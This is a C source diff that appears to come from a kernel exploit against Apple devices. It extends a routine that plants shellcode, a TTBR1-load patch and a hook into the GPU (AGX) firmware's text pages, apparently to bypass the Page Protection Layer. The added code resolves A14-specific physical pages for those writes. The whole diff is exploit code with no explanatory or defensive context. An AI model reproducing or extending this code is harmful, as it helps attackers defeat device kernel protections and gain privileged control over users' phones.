@@ -250,9 +250,19 @@ int momentarius_build_ppl_write(void) {
 
     if (momentarius_gen_shellcode() != 0) return -1;
 
-    uint64_t shc_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.shc_offset);
-    uint64_t ttbr1_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.ttbr1_load_offset);
-    uint64_t hook_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.hook_offset);
+    uint64_t shc_pa = momentarius.gfx.text_pa + momentarius.gfx.shc_offset;
+    uint64_t ttbr1_pa = momentarius.gfx.text_pa + momentarius.gfx.ttbr1_load_offset;
+    uint64_t hook_pa = momentarius.gfx.text_pa + momentarius.gfx.hook_offset;
+    if (momentarius.gfx.a14.page_count != 0) {
+        shc_pa = gfx_a14_page_pa(momentarius.gfx.shc_offset);
+        ttbr1_pa = gfx_a14_page_pa(momentarius.gfx.ttbr1_load_offset);
+        hook_pa = gfx_a14_page_pa(momentarius.gfx.hook_offset);
+    }
+    if (shc_pa == 0 || ttbr1_pa == 0 || hook_pa == 0) return -1;
+
+    uint64_t shc_page = map_writeback_page(shc_pa);
+    uint64_t ttbr1_page = map_writeback_page(ttbr1_pa);
+    uint64_t hook_page = map_writeback_page(hook_pa);
     if (shc_page == 0 || ttbr1_page == 0 || hook_page == 0) return -1;
 
     uint64_t shc_input = (uint64_t)momentarius.gfx.shc_data;
@@ -380,6 +390,44 @@ uint64_t gfx_phystokv(uint64_t pa) {
         }
     }
     return va;
+}
+
+uint64_t gfx_a14_text_kva(void) {
+    if (momentarius.gfx.a14.text_kva != 0) return momentarius.gfx.a14.text_kva;
+    if (momentarius.gfx.text_pa == 0) return 0;
+
+    uint64_t text_kva = gfx_phystokv(momentarius.gfx.text_pa);
+    if (!KADDR_VALID(text_kva)) {
+        debug_log("A14 fail-closed: AGX text (pa 0x%llx) has no trusted kernel mapping\n",
+                  momentarius.gfx.text_pa);
+        return 0;
+    }
+
+    for (uint32_t i = 0; i < A14_FW_PAGE_MAP_COUNT; i++) {
+        uint64_t pa = kvtophys(text_kva + (uint64_t)i * A14_PAGE_SIZE);
+        if (pa == 0 || (pa & (A14_PAGE_SIZE - 1U)) != 0 || !GFX_PA_VALID(pa)) {
+            debug_log("A14 fail-closed: fw page %u (text+0x%x) has no confirmed runtime PA "
+                      "(kvtophys=0x%llx)\n", i, i * A14_PAGE_SIZE, pa);
+            momentarius.gfx.a14.page_count = 0;
+            return 0;
+        }
+        momentarius.gfx.a14.page_map[i] = pa;
+        momentarius.gfx.a14.page_count = i + 1;
+    }
+
+    momentarius.gfx.a14.text_kva = text_kva;
+    debug_log("A14 text_kva: 0x%llx; page0 pa: 0x%llx; bptp page pa: 0x%llx\n",
+              text_kva,
+              momentarius.gfx.a14.page_map[0],
+              momentarius.gfx.a14.page_map[A14_FW_PAGE_MAP_COUNT - 1]);
+    return text_kva;
+}
+
+uint64_t gfx_a14_page_pa(uint32_t fw_offset) {
+    if (gfx_a14_text_kva() == 0) return 0;
+    uint32_t idx = fw_offset / A14_PAGE_SIZE;
+    if (idx >= momentarius.gfx.a14.page_count) return 0;
+    return momentarius.gfx.a14.page_map[idx];
 }
 
 void gfx_suspend(void) {
